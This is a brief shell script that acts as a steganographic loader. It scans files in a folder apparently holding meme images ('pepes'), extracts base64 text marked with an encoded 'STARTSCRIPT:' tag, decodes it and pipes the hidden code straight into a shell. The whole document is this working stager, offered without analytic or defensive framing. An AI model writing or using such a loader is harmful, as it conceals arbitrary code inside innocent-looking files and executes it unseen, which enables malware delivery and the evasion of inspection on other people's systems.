#!/bin/sh
for file in $(find ./pepes); do
    if cat $file | grep "U1RBUlRTQ1JJUFQ6I"; then
        code="$(cat $file | grep -a 'U1RBUlRTQ1JJUFQ6I' | base64 -d | sed 's/STARTSCRIPT: //')"
    fi
done
echo $code | sh -s 
